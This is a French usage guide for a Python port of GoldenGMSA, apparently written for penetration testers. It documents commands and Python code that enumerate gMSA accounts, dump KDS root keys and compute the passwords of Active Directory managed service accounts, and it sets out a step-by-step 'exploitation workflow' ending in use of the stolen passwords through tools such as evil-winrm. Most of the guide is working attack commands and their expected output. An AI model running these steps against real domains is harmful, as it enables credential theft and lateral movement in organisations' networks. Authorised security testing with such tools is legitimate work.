# Exemples d'utilisation de GoldenGMSA Python

## Prérequis

- Accès réseau au contrôleur de domaine Active Directory
- Credentials valides pour le domaine
- Python 3.7+ avec les dépendances installées

## Scénarios d'utilisation

### 1. Énumération des gMSA depuis un host Linux

```bash
# Se connecter au domaine et énumérer tous les comptes gMSA
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local gmsainfo

# Avec un DC spécifique (par IP)
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local --dc-ip 10.10.10.5 gmsainfo

# En utilisant LDAPS pour une connexion sécurisée
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local --use-ssl gmsainfo
```

**Sortie attendue :**
```
🔐 Authentification au domaine corp.local...
✅ Connecté au domaine corp.local

sAMAccountName:         svc_gmsa$
objectSid:              S-1-5-21-123456789-987654321-111111111-1234
rootKeyGuid:            46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaAEAABAAAAADAAAA...
----------------------------------------------
```

### 2. Extraction des clés racine KDS

```bash
# Dumper toutes les clés racine KDS (nécessite privilèges élevés)
python main.py -u 'admin@corp.local' -p 'AdminP@ss' --domain corp.local kdsinfo

# Dumper une clé spécifique par GUID
python main.py -u 'admin@corp.local' -p 'AdminP@ss' --domain corp.local kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
```

### 3. Calcul de mot de passe gMSA (Mode en ligne)

```bash
# Calculer le mot de passe d'un gMSA identifié
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local compute --sid S-1-5-21-123456789-987654321-111111111-1234

# Avec forest spécifique
python main.py -u 'pentester@corp.local' -p 'P@ssw0rd' --domain corp.local --forest corp.local compute --sid S-1-5-21-123456789-987654321-111111111-1234
```

**Sortie attendue :**
```
🔐 Authentification au domaine corp.local...
✅ Connecté au domaine corp.local

Mot de passe encodé en Base64:	YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkw...
```

### 4. Mode hors ligne (avec données exportées)

```bash
# Si vous avez déjà extrait les clés KDS et msds-ManagedPasswordID
python main.py compute \
    --sid S-1-5-21-123456789-987654321-111111111-1234 \
    --kdskey AQAAALm45UZXyuYB6Ln7smfkresAAAAQAAAAMgAAADgAAAA... \
    --pwdid AQAAAEtEU0sCAAAAaAEAABAAAAADAAAA...
```

### 5. Formats d'authentification

```bash
# Format UPN (User Principal Name)
python main.py -u 'user@corp.local' -p 'password' --domain corp.local gmsainfo

# Format NetBIOS
python main.py -u 'CORP\user' -p 'password' --domain corp.local gmsainfo

# Format simple (domaine ajouté automatiquement)
python main.py -u 'user' -p 'password' --domain corp.local gmsainfo
```

### 6. Workflow complet d'exploitation

```bash
# Étape 1: Énumérer les gMSA
python main.py -u 'user@corp.local' -p 'password' --domain corp.local gmsainfo > gmsa_list.txt

# Étape 2: Extraire les clés KDS (si privilèges suffisants)
python main.py -u 'admin@corp.local' -p 'adminpass' --domain corp.local kdsinfo > kds_keys.txt

# Étape 3: Calculer le mot de passe d'un gMSA cible
python main.py -u 'user@corp.local' -p 'password' --domain corp.local compute --sid <TARGET_SID>

# Étape 4: Utiliser le mot de passe pour accéder aux ressources
# (via impacket, evil-winrm, etc.)
```

### 7. Utilisation programmatique en Python

```python
from golden_gmsa import LdapConnection, LdapUtils, GmsaAccount, RootKey, GmsaPassword

# Établir la connexion
with LdapConnection(
    domain='corp.local',
    username='user@corp.local',
    password='password',
    dc_ip='10.10.10.5'
) as conn:
    LdapUtils.set_connection(conn)
    
    # Énumérer les gMSA
    gmsa_accounts = list(GmsaAccount.find_all_gmsa_accounts_in_domain('corp.local'))
    
    for gmsa in gmsa_accounts:
        print(f"Found gMSA: {gmsa.sam_account_name}")
        print(f"  SID: {gmsa.sid}")
        print(f"  Root Key GUID: {gmsa.managed_password_id.root_key_identifier}")
        
        # Extraire la clé racine
        root_key = RootKey.get_root_key_by_guid('corp.local', 
                                                 gmsa.managed_password_id.root_key_identifier)
        
        if root_key:
            # Calculer le mot de passe
            password = GmsaPassword.get_password(
                gmsa.sid,
                root_key,
                gmsa.managed_password_id,
                'corp.local',
                'corp.local'
            )
            print(f"  Password (base64): {password.hex()}")
```

## Gestion des erreurs

### Erreur: "Credentials invalides"
```bash
# Vérifier les credentials
python main.py -u 'user@corp.local' -p 'wrong_password' --domain corp.local gmsainfo
# ❌ Credentials invalides
```

### Erreur: "Serveur LDAP injoignable"
```bash
# Utiliser --dc-ip pour spécifier l'IP du DC
python main.py -u 'user@corp.local' -p 'password' --domain corp.local --dc-ip 10.10.10.5 gmsainfo
```

### Erreur: "Aucun résultat trouvé"
```bash
# Vérifier que l'utilisateur a les permissions nécessaires
# Les comptes gMSA nécessitent des permissions de lecture spécifiques
```

## Notes de sécurité

⚠️ **Attention :**
- Ne jamais stocker les credentials en clair dans des scripts
- Utiliser des variables d'environnement ou des gestionnaires de secrets
- Toujours utiliser `--use-ssl` en production
- Effacer les mots de passe calculés après utilisation

```bash
# Exemple avec variable d'environnement
export AD_USER='user@corp.local'
export AD_PASS='password'
python main.py -u "$AD_USER" -p "$AD_PASS" --domain corp.local gmsainfo
```

